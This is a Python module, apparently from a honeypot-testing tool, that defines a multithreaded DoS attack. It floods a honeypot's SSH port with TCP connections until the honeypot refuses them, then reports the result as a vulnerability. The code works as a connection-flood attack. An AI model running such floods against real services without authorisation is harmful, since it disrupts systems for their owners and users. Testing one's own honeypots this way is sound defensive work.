import threading
import time
import socket

from honeypots import BaseHoneypot
from .base_attack import BaseAttack, AttackResults


class DoS(BaseAttack):
    def __init__(self, honeypot: BaseHoneypot) -> None:
        """
        Initializes a new DoS object.

        Args:
            honeypot (BaseHoneypot): Honeypot object holding the information
                                     to use in the attack.
        """
        super().__init__(honeypot)
        self.honeypot_rejecting_connections: bool = False

    def attack(self) -> None:
        """
        Attempt to flood the honeypot with connections until
        it starts rejecting them.
        """
        while not self.honeypot_rejecting_connections:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.connect((self.honeypot.ip, self.honeypot.port))
                time.sleep(0.01)
            except Exception:
                self.honeypot_rejecting_connections = True
            finally:
                sock.close()

    def run_attack(self, num_threads=40) -> AttackResults:
        """
        Launch the DoS attack using multiple threads.
        """
        print(f"Running DoS attack on {self.honeypot.ip}:{self.honeypot.port}...")

        threads = [threading.Thread(target=self.attack)
                   for _ in range(num_threads)]

        start_time: float = time.time()

        for thread in threads:
            thread.start()

        while not self.honeypot_rejecting_connections:
            time.sleep(1)

        for thread in threads:
            thread.join()

        end_time: float = time.time()
        time_taken: float = end_time - start_time

        return (True,
                "Vulnerability found: DoS attack made the SSH honeypot reject connections",
                time_taken,
                num_threads)
